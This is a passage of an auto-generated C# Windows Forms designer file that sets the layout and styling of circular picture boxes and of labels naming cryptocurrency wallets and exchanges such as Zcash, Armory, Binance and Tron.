            this.rjCircularPictureBox27.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox27.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox27.BorderSize = 2;
            this.rjCircularPictureBox27.GradientAngle = 50F;
            this.rjCircularPictureBox27.Location = new System.Drawing.Point(388, 296);
            this.rjCircularPictureBox27.Name = "rjCircularPictureBox27";
            this.rjCircularPictureBox27.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox27.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox27.TabIndex = 239;
            this.rjCircularPictureBox27.TabStop = false;
            // 
            // rjCircularPictureBox26
            // 
            this.rjCircularPictureBox26.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox26.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox26.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox26.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox26.BorderSize = 2;
            this.rjCircularPictureBox26.GradientAngle = 50F;
            this.rjCircularPictureBox26.Location = new System.Drawing.Point(388, 108);
            this.rjCircularPictureBox26.Name = "rjCircularPictureBox26";
            this.rjCircularPictureBox26.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox26.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox26.TabIndex = 238;
            this.rjCircularPictureBox26.TabStop = false;
            // 
            // label35
            // 
            this.label35.AutoSize = true;
            this.label35.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label35.ForeColor = System.Drawing.Color.Black;
            this.label35.Location = new System.Drawing.Point(946, 121);
            this.label35.Name = "label35";
            this.label35.Size = new System.Drawing.Size(49, 12);
            this.label35.TabIndex = 209;
            this.label35.Text = "Bytecoin";
            // 
            // rjCircularPictureBox25
            // 
            this.rjCircularPictureBox25.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox25.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox25.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox25.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox25.BorderSize = 2;
            this.rjCircularPictureBox25.GradientAngle = 50F;
            this.rjCircularPictureBox25.Location = new System.Drawing.Point(901, 232);
            this.rjCircularPictureBox25.Name = "rjCircularPictureBox25";
            this.rjCircularPictureBox25.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox25.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox25.TabIndex = 237;
            this.rjCircularPictureBox25.TabStop = false;
            // 
            // rjCircularPictureBox24
            // 
            this.rjCircularPictureBox24.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox24.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox24.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox24.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox24.BorderSize = 2;
            this.rjCircularPictureBox24.GradientAngle = 50F;
            this.rjCircularPictureBox24.Location = new System.Drawing.Point(196, 358);
            this.rjCircularPictureBox24.Name = "rjCircularPictureBox24";
            this.rjCircularPictureBox24.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox24.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox24.TabIndex = 235;
            this.rjCircularPictureBox24.TabStop = false;
            // 
            // rjCircularPictureBox23
            // 
            this.rjCircularPictureBox23.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox23.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox23.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox23.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox23.BorderSize = 2;
            this.rjCircularPictureBox23.GradientAngle = 50F;
            this.rjCircularPictureBox23.Location = new System.Drawing.Point(558, 169);
            this.rjCircularPictureBox23.Name = "rjCircularPictureBox23";
            this.rjCircularPictureBox23.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox23.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox23.TabIndex = 234;
            this.rjCircularPictureBox23.TabStop = false;
            // 
            // rjCircularPictureBox22
            // 
            this.rjCircularPictureBox22.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox22.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox22.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox22.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox22.BorderSize = 2;
            this.rjCircularPictureBox22.GradientAngle = 50F;
            this.rjCircularPictureBox22.Location = new System.Drawing.Point(901, 296);
            this.rjCircularPictureBox22.Name = "rjCircularPictureBox22";
            this.rjCircularPictureBox22.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox22.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox22.TabIndex = 233;
            this.rjCircularPictureBox22.TabStop = false;
            // 
            // rjCircularPictureBox21
            // 
            this.rjCircularPictureBox21.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox21.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox21.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox21.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox21.BorderSize = 2;
            this.rjCircularPictureBox21.GradientAngle = 50F;
            this.rjCircularPictureBox21.Location = new System.Drawing.Point(731, 296);
            this.rjCircularPictureBox21.Name = "rjCircularPictureBox21";
            this.rjCircularPictureBox21.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox21.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox21.TabIndex = 232;
            this.rjCircularPictureBox21.TabStop = false;
            // 
            // rjCircularPictureBox20
            // 
            this.rjCircularPictureBox20.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox20.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox20.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox20.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox20.BorderSize = 2;
            this.rjCircularPictureBox20.GradientAngle = 50F;
            this.rjCircularPictureBox20.Location = new System.Drawing.Point(196, 232);
            this.rjCircularPictureBox20.Name = "rjCircularPictureBox20";
            this.rjCircularPictureBox20.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox20.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox20.TabIndex = 231;
            this.rjCircularPictureBox20.TabStop = false;
            // 
            // rjCircularPictureBox19
            // 
            this.rjCircularPictureBox19.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox19.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox19.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox19.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox19.BorderSize = 2;
            this.rjCircularPictureBox19.GradientAngle = 50F;
            this.rjCircularPictureBox19.Location = new System.Drawing.Point(196, 169);
            this.rjCircularPictureBox19.Name = "rjCircularPictureBox19";
            this.rjCircularPictureBox19.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox19.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox19.TabIndex = 230;
            this.rjCircularPictureBox19.TabStop = false;
            // 
            // rjCircularPictureBox18
            // 
            this.rjCircularPictureBox18.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox18.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox18.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox18.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox18.BorderSize = 2;
            this.rjCircularPictureBox18.GradientAngle = 50F;
            this.rjCircularPictureBox18.Location = new System.Drawing.Point(388, 358);
            this.rjCircularPictureBox18.Name = "rjCircularPictureBox18";
            this.rjCircularPictureBox18.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox18.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox18.TabIndex = 229;
            this.rjCircularPictureBox18.TabStop = false;
            // 
            // rjCircularPictureBox17
            // 
            this.rjCircularPictureBox17.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox17.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox17.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox17.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox17.BorderSize = 2;
            this.rjCircularPictureBox17.GradientAngle = 50F;
            this.rjCircularPictureBox17.Location = new System.Drawing.Point(388, 232);
            this.rjCircularPictureBox17.Name = "rjCircularPictureBox17";
            this.rjCircularPictureBox17.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox17.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox17.TabIndex = 228;
            this.rjCircularPictureBox17.TabStop = false;
            // 
            // rjCircularPictureBox16
            // 
            this.rjCircularPictureBox16.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox16.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox16.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox16.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox16.BorderSize = 2;
            this.rjCircularPictureBox16.GradientAngle = 50F;
            this.rjCircularPictureBox16.Location = new System.Drawing.Point(731, 108);
            this.rjCircularPictureBox16.Name = "rjCircularPictureBox16";
            this.rjCircularPictureBox16.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox16.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox16.TabIndex = 227;
            this.rjCircularPictureBox16.TabStop = false;
            // 
            // rjCircularPictureBox15
            // 
            this.rjCircularPictureBox15.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox15.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox15.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox15.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox15.BorderSize = 2;
            this.rjCircularPictureBox15.GradientAngle = 50F;
            this.rjCircularPictureBox15.Location = new System.Drawing.Point(558, 108);
            this.rjCircularPictureBox15.Name = "rjCircularPictureBox15";
            this.rjCircularPictureBox15.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox15.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox15.TabIndex = 226;
            this.rjCircularPictureBox15.TabStop = false;
            // 
            // rjCircularPictureBox14
            // 
            this.rjCircularPictureBox14.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox14.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox14.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox14.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox14.BorderSize = 2;
            this.rjCircularPictureBox14.GradientAngle = 50F;
            this.rjCircularPictureBox14.Location = new System.Drawing.Point(49, 232);
            this.rjCircularPictureBox14.Name = "rjCircularPictureBox14";
            this.rjCircularPictureBox14.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox14.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox14.TabIndex = 225;
            this.rjCircularPictureBox14.TabStop = false;
            // 
            // rjCircularPictureBox13
            // 
            this.rjCircularPictureBox13.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox13.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox13.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox13.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox13.BorderSize = 2;
            this.rjCircularPictureBox13.GradientAngle = 50F;
            this.rjCircularPictureBox13.Location = new System.Drawing.Point(901, 108);
            this.rjCircularPictureBox13.Name = "rjCircularPictureBox13";
            this.rjCircularPictureBox13.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox13.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox13.TabIndex = 224;
            this.rjCircularPictureBox13.TabStop = false;
            // 
            // rjCircularPictureBox12
            // 
            this.rjCircularPictureBox12.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox12.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox12.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox12.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox12.BorderSize = 2;
            this.rjCircularPictureBox12.GradientAngle = 50F;
            this.rjCircularPictureBox12.Location = new System.Drawing.Point(558, 358);
            this.rjCircularPictureBox12.Name = "rjCircularPictureBox12";
            this.rjCircularPictureBox12.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox12.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox12.TabIndex = 223;
            this.rjCircularPictureBox12.TabStop = false;
            // 
            // rjCircularPictureBox9
            // 
            this.rjCircularPictureBox9.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox9.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox9.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox9.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox9.BorderSize = 2;
            this.rjCircularPictureBox9.GradientAngle = 50F;
            this.rjCircularPictureBox9.Location = new System.Drawing.Point(196, 296);
            this.rjCircularPictureBox9.Name = "rjCircularPictureBox9";
            this.rjCircularPictureBox9.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox9.TabIndex = 222;
            this.rjCircularPictureBox9.TabStop = false;
            // 
            // rjCircularPictureBox10
            // 
            this.rjCircularPictureBox10.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox10.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox10.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox10.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox10.BorderSize = 2;
            this.rjCircularPictureBox10.GradientAngle = 50F;
            this.rjCircularPictureBox10.Location = new System.Drawing.Point(388, 169);
            this.rjCircularPictureBox10.Name = "rjCircularPictureBox10";
            this.rjCircularPictureBox10.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox10.TabIndex = 221;
            this.rjCircularPictureBox10.TabStop = false;
            // 
            // rjCircularPictureBox11
            // 
            this.rjCircularPictureBox11.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox11.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox11.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox11.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox11.BorderSize = 2;
            this.rjCircularPictureBox11.GradientAngle = 50F;
            this.rjCircularPictureBox11.Location = new System.Drawing.Point(49, 358);
            this.rjCircularPictureBox11.Name = "rjCircularPictureBox11";
            this.rjCircularPictureBox11.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox11.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox11.TabIndex = 220;
            this.rjCircularPictureBox11.TabStop = false;
            // 
            // rjCircularPictureBox6
            // 
            this.rjCircularPictureBox6.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox6.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox6.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox6.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox6.BorderSize = 2;
            this.rjCircularPictureBox6.GradientAngle = 50F;
            this.rjCircularPictureBox6.Location = new System.Drawing.Point(49, 169);
            this.rjCircularPictureBox6.Name = "rjCircularPictureBox6";
            this.rjCircularPictureBox6.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox6.TabIndex = 219;
            this.rjCircularPictureBox6.TabStop = false;
            // 
            // rjCircularPictureBox7
            // 
            this.rjCircularPictureBox7.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox7.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox7.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox7.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox7.BorderSize = 2;
            this.rjCircularPictureBox7.GradientAngle = 50F;
            this.rjCircularPictureBox7.Location = new System.Drawing.Point(901, 358);
            this.rjCircularPictureBox7.Name = "rjCircularPictureBox7";
            this.rjCircularPictureBox7.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox7.TabIndex = 218;
            this.rjCircularPictureBox7.TabStop = false;
            // 
            // rjCircularPictureBox5
            // 
            this.rjCircularPictureBox5.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox5.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox5.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox5.BorderSize = 2;
            this.rjCircularPictureBox5.GradientAngle = 50F;
            this.rjCircularPictureBox5.Location = new System.Drawing.Point(49, 108);
            this.rjCircularPictureBox5.Name = "rjCircularPictureBox5";
            this.rjCircularPictureBox5.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox5.TabIndex = 216;
            this.rjCircularPictureBox5.TabStop = false;
            // 
            // rjCircularPictureBox4
            // 
            this.rjCircularPictureBox4.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox4.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox4.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox4.BorderSize = 2;
            this.rjCircularPictureBox4.GradientAngle = 50F;
            this.rjCircularPictureBox4.Location = new System.Drawing.Point(196, 108);
            this.rjCircularPictureBox4.Name = "rjCircularPictureBox4";
            this.rjCircularPictureBox4.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox4.TabIndex = 215;
            this.rjCircularPictureBox4.TabStop = false;
            // 
            // rjCircularPictureBox3
            // 
            this.rjCircularPictureBox3.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox3.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox3.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox3.BorderSize = 2;
            this.rjCircularPictureBox3.GradientAngle = 50F;
            this.rjCircularPictureBox3.Location = new System.Drawing.Point(558, 232);
            this.rjCircularPictureBox3.Name = "rjCircularPictureBox3";
            this.rjCircularPictureBox3.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox3.TabIndex = 214;
            this.rjCircularPictureBox3.TabStop = false;
            // 
            // rjCircularPictureBox2
            // 
            this.rjCircularPictureBox2.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox2.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox2.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox2.BorderSize = 2;
            this.rjCircularPictureBox2.GradientAngle = 50F;
            this.rjCircularPictureBox2.Location = new System.Drawing.Point(49, 296);
            this.rjCircularPictureBox2.Name = "rjCircularPictureBox2";
            this.rjCircularPictureBox2.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox2.TabIndex = 213;
            this.rjCircularPictureBox2.TabStop = false;
            // 
            // rjCircularPictureBox1
            // 
            this.rjCircularPictureBox1.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox1.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox1.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox1.BorderSize = 2;
            this.rjCircularPictureBox1.GradientAngle = 50F;
            this.rjCircularPictureBox1.Location = new System.Drawing.Point(901, 169);
            this.rjCircularPictureBox1.Name = "rjCircularPictureBox1";
            this.rjCircularPictureBox1.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox1.TabIndex = 212;
            this.rjCircularPictureBox1.TabStop = false;
            // 
            // label37
            // 
            this.label37.AutoSize = true;
            this.label37.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label37.Location = new System.Drawing.Point(94, 121);
            this.label37.Name = "label37";
            this.label37.Size = new System.Drawing.Size(33, 12);
            this.label37.TabIndex = 211;
            this.label37.Text = "Zcash";
            // 
            // label36
            // 
            this.label36.AutoSize = true;
            this.label36.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label36.Location = new System.Drawing.Point(610, 121);
            this.label36.Name = "label36";
            this.label36.Size = new System.Drawing.Size(42, 12);
            this.label36.TabIndex = 210;
            this.label36.Text = "Armory";
            // 
            // label30
            // 
            this.label30.AutoSize = true;
            this.label30.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label30.Location = new System.Drawing.Point(439, 245);
            this.label30.Name = "label30";
            this.label30.Size = new System.Drawing.Size(44, 12);
            this.label30.TabIndex = 206;
            this.label30.Text = "Binance";
            // 
            // label29
            // 
            this.label29.AutoSize = true;
            this.label29.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label29.Location = new System.Drawing.Point(250, 245);
            this.label29.Name = "label29";
            this.label29.Size = new System.Drawing.Size(38, 12);
            this.label29.TabIndex = 153;
            this.label29.Text = "Coin98";
            // 
            // label32
            // 
            this.label32.AutoSize = true;
            this.label32.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label32.Location = new System.Drawing.Point(785, 309);
            this.label32.Name = "label32";
            this.label32.Size = new System.Drawing.Size(39, 12);
            this.label32.TabIndex = 147;
            this.label32.Text = "Iconex";
            // 
            // label33
            // 
            this.label33.AutoSize = true;
            this.label33.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label33.Location = new System.Drawing.Point(250, 309);
            this.label33.Name = "label33";
            this.label33.Size = new System.Drawing.Size(32, 12);
            this.label33.TabIndex = 149;
            this.label33.Text = "Equal";
            // 
            // label34
            // 
            this.label34.AutoSize = true;
            this.label34.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label34.Location = new System.Drawing.Point(250, 182);
            this.label34.Name = "label34";
            this.label34.Size = new System.Drawing.Size(38, 12);
            this.label34.TabIndex = 151;
            this.label34.Text = "Bitapp";
            // 
            // label23
            // 
            this.label23.AutoSize = true;
            this.label23.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label23.Location = new System.Drawing.Point(785, 182);
            this.label23.Name = "label23";
            this.label23.Size = new System.Drawing.Size(37, 12);
            this.label23.TabIndex = 141;
            this.label23.Text = "Mobox";
            // 
            // label24
            // 
            this.label24.AutoSize = true;
            this.label24.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label24.Location = new System.Drawing.Point(439, 371);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(30, 12);
            this.label24.TabIndex = 143;
            this.label24.Text = "Math";
            // 
            // label26
            // 
            this.label26.AutoSize = true;
            this.label26.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label26.Location = new System.Drawing.Point(785, 245);
            this.label26.Name = "label26";
            this.label26.Size = new System.Drawing.Size(30, 12);
            this.label26.TabIndex = 135;
            this.label26.Text = "Guild";
            // 
            // label27
            // 
            this.label27.AutoSize = true;
            this.label27.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label27.Location = new System.Drawing.Point(94, 245);
            this.label27.Name = "label27";
            this.label27.Size = new System.Drawing.Size(27, 12);
            this.label27.TabIndex = 137;
            this.label27.Text = "Tron";
            // 
            // label28
            // 
            this.label28.AutoSize = true;
